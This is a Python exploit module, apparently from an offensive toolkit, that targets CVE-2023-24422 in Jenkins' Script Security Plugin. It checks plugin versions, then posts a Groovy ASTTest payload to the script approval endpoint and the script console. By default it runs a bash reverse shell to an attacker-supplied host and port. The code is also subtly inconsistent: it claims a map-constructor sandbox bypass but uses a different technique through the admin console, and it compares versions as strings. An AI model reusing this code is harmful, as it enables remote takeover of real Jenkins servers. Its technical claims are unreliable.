"""
CVE-2023-24422: Script Security Plugin Sandbox Bypass

Script Security Plugin provides a sandbox feature that allows low privileged users to define
scripts. In affected versions, property assignments performed implicitly by the Groovy language
runtime when invoking map constructors were not intercepted by the sandbox, allowing arbitrary
code execution in the Jenkins controller JVM.
"""

from typing import Any

from jenkins_breaker.core.authentication import CrumbManager
from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2023_24422(ExploitModule):
    """Script Security sandbox bypass via Groovy map constructor property assignment."""

    CVE_ID = "CVE-2023-24422"

    METADATA = ExploitMetadata(
        cve_id="CVE-2023-24422",
        name="Script Security Plugin Sandbox Bypass",
        description="Sandbox bypass via Groovy map constructor property assignment",
        affected_versions=["<= 1228.vd93135a_2fb_25"],
        mitre_attack=["T1059", "T1190"],
        severity="high",
        references=[
            "https://www.jenkins.io/security/advisory/2023-01-24/",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-24422"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "sandbox-bypass", "groovy", "script-security"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance has vulnerable Script Security plugin.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/pluginManager/api/json?depth=1")

            if response.status_code == 200:
                data = response.json()
                for plugin in data.get('plugins', []):
                    if plugin.get('shortName') == 'script-security':
                        version = plugin.get('version', '')

                        if version <= '1228.vd93135a_2fb_25':
                            return True
            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2023-24422 to bypass sandbox and execute arbitrary code.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (lhost, lport, cmd)

        Returns:
            ExploitResult: Result of the exploit
        """
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport')
        cmd = kwargs.get('cmd', f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' if lhost and lport else None)

        if not cmd:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details="No command provided (lhost/lport or cmd required)",
                error="Missing required parameter: cmd or lhost+lport"
            )

        payload = f'''
@groovy.transform.ASTTest(value={{
    def proc = ['sh', '-c', '{cmd}'].execute()
    proc.waitFor()
}})
class Exploit {{}}

new Exploit()
'''

        try:
            crumb_manager = CrumbManager(session)
            crumb_data = crumb_manager.fetch_crumb()

            headers = {}
            if crumb_data:
                headers[crumb_data.header] = crumb_data.value

            script_url = "/scriptApproval/approveScript"

            data = {
                'script': payload
            }

            response = session.post(script_url, data=data, headers=headers)

            console_url = "/script"

            data = {
                'script': payload
            }

            response = session.post(console_url, data=data, headers=headers)

            if response.status_code == 200:
                if 'Result' in response.text or 'java.lang.String' in response.text:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details="Sandbox bypassed via map constructor, command executed",
                        data={
                            "command": cmd,
                            "method": "ASTTest annotation with map constructor",
                            "endpoint": "script console"
                        }
                    )
                else:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="partial",
                        details="Script submitted but execution result unclear"
                    )
            elif response.status_code == 403:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="Access denied - insufficient permissions for script console"
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Exploit failed with HTTP {response.status_code}"
                )

        except Exception as e:
            if 'timeout' in str(e).lower():
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="partial",
                    details="Timeout during execution - command may have executed successfully"
                )

            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution error: {str(e)}"
            )
